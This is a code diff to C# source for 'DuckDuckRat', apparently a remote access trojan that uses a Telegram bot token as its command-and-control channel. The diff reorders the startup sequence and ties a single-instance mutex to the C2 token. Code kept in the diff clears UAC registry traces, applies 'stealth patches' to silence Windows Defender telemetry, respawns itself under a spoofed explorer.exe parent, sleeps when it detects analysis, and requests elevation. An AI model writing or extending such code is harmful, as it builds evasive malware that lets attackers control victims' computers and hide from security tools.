@@ -34,23 +34,30 @@ namespace DuckDuckRat
                 e.SetObserved();
             };
 
-            // [STEP 0] Proactive Registry Sanitization (Clean old indicators)
+            // [STEP 0] Initialize Registry Sanitizer & Crypto Keys
             RegistryCleanup.SanitizeUacTraces();
+            SafetyManager.StartupKeys();
 
-            // [STEP 1] Mutex Acquisition (Path-Specific to avoid Cross-Service Conflicts)
+            // [STEP 1] Resolve Master Identifier (C2 Token) for Global Mutex
+            string botToken = SafetyManager.Resolve("BOT_TOKEN_1");
+            
+            // [STEP 2] Mutex Acquisition (Token-Specific to avoid C2 Polling Conflicts)
             bool createdNew;
-            string mutexName = GetStableMutexName();
+            string mutexName = GetStableMutexName(botToken);
             _mutex = new Mutex(true, mutexName, out createdNew);
 
             if (!createdNew)
             {
-                // [RED TEAM] Silent Backoff: Don't fight for the Telegram session if an instance is already active.
+                // [RED TEAM] Global Session Monarchy: Only one instance per token can exist.
                 // This prevents the "Conflict: terminated by other getUpdates request" error.
-                DebugLog("Mutex conflict detected. Strategic backoff (5s)...");
+                DebugLog("Global Mutex conflict. Strategic backoff (5s)...");
                 Thread.Sleep(5000);
                 return; 
             }
-            DebugLog($"Mutex acquired: {mutexName}.");
+            DebugLog($"Session Lock Acquired: {mutexName}.");
+
+            // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
+            SafetyManager.ApplyStealthPatches();
 
             // [GHOST] Self-Respawn with PPID Spoofing (explorer.exe)
             string cmdLine = Environment.CommandLine;
@@ -72,12 +79,6 @@ namespace DuckDuckRat
                 AntiAnalysis.EnterSleepMode(); 
                 return;
             }
-
-            // [V6.12] Initialize Crypto Keys first for reliable Vault access
-            SafetyManager.StartupKeys();
-
-            // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
-            SafetyManager.ApplyStealthPatches();
 
             DebugLog($"Startup [GHOST]: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
             int fromPid = 0;
@@ -142,7 +143,7 @@ namespace DuckDuckRat
                         string selfPath = sb.ToString();
                         _mutex?.Dispose();
                         if (ElevationService.RequestElevation(selfPath)) Process.GetCurrentProcess().Kill();
-                        _mutex = new Mutex(true, GetStableMutexName(), out _);
+                        _mutex = new Mutex(true, GetStableMutexName(botToken), out _);
                     } catch { }
                 });
             }
@@ -194,12 +195,12 @@ namespace DuckDuckRat
             }
         }
 
-        private static string GetStableMutexName()
+        private static string GetStableMutexName(string token)
         {
             try {
-                // [RED TEAM] Path-bound Mutex: prevents conflicts if multiple builds are running from different folders.
-                string path = Process.GetCurrentProcess().MainModule.FileName.ToLower();
-                string seed = Environment.MachineName + Environment.UserName + path;
+                // [RED TEAM] Token-Locked Mutex: Prevents polling conflicts across different folders/users.
+                // Identity is tied to the C2 channel (Bot Token).
+                string seed = Environment.MachineName + "_" + (token ?? "fallback_token");
                 
                 using var sha = System.Security.Cryptography.SHA256.Create();
                 byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
